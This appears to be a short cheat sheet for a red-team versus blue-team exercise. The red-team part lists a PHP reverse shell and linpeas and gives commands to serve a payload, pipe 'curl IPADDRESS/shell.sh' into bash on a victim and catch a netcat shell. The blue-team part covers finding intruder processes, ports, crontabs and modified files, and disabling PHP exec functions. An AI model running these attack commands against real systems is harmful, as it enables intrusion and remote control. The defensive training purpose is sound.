# Setup

## Red team

### www directory

- public key
- linpeas.sh
- php-reverse-hell.php
- setup.sh

```
./startbg.sh IPADDRESS
cd www
python3 -m http.server 80

On victim machine
curl IPADDRESS/shell.sh | bash

nc -lvnp 9001
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Blue Team

### Patching

Find which process is running on port 3000 using netstat.

```
netstat -nlp | grep 3000

ps -p <PROCESS ID>

Patch and kill the process

kill -9 <PROCESS ID>
```

### How to check if port is in use in

```
sudo lsof -i -P -n | grep LISTEN
sudo netstat -tulpn | grep LISTEN
sudo ss -tulpn | grep LISTEN
sudo lsof -i:22 ## see a specific port such as 22 ##
sudo nmap -sTU -O IP-address-Here
```

### Find running processes

```
ps -eaf --forest

Find reverse shell PID
In order to find where the shell is

ls -la /proc/PID | grep cwd

To send them a message
cd fd (file descriptors)

echo "ALF Cardoso (FAP) has caught you!" > 0

To find out their IP address
ss -anp | grep PID
```

### Check logins

```
w
```

### Listen for connections with tcpdump

```
tcpdump -i ens160 -w tcpdump.cap -s 0 -n "port not 22"
```

### Check crontabs

```
cd  /var/spool/cron
find .
```

### Check for modified files

```
find . -mmin -15 -type f -ls
```

### Remove php reverse shells

```
nano /etc/php/7.2/apache2/php.ini

Remove functions to improve security
disable_functions = ...exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```
